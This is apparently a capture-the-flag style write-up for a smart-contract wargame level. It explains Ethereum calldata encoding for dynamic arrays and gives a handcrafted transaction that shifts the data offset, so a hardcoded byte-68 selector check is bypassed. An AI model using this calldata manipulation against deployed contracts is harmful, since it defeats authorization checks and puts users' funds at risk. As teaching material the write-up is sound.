# Logic
`Hint` -> Calldata encoding for dynamic arrays

# Calldata encoding
For dynamic types the calldata encoding is the following:
1. first 32-bytes are for offset
2. next 32 bytes are for the length
3. and next are for the values

Example:
```
0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
```

`30c13ade` -> function selector

`0000000000000000000000000000000000000000000000000000000000000020` -> offset

`0000000000000000000000000000000000000000000000000000000000000004` -> length

`20606e1500000000000000000000000000000000000000000000000000000000` -> value

offset indicates the start bytes of the data. In this example `20` hex = `32` decimal. So the data starts after the first 32 bytes.
```
0000000000000000000000000000000000000000000000000000000000000020
^
| -> counting 32 bytes from here

0000000000000000000000000000000000000000000000000000000000000004
^
| so this is the actual start

20606e1500000000000000000000000000000000000000000000000000000000
```

We can see that the check is made at a hardcoded value, `68`. So the solution is to move the data that is checked from the data that is used to make the call


# Solution
```
await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

Explanation:

`30c13ade` -> function selector

`0000000000000000000000000000000000000000000000000000000000000060` -> offset, now = 96-bytes

`0000000000000000000000000000000000000000000000000000000000000000` -> extra bytes

`20606e1500000000000000000000000000000000000000000000000000000000` -> here is the check at `68` byte, but it is not relevant for the call

`0000000000000000000000000000000000000000000000000000000000000004` -> length of the data

`76227e1200000000000000000000000000000000000000000000000000000000` -> data that contains the selector
